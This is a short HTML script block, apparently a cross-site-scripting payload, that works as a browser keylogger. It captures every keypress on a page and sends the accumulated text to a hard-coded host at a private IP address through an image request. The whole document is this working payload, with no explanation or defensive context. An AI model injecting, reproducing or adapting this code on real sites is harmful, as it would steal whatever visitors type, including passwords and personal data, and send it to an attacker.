<script>
	var k = "";
	document.onkeypress = function(e){
		e = e || window.event;
		k += e.key;
		var i = new Image();
		i.src = "http://192.168.146.128/" + k;
	};
</script>
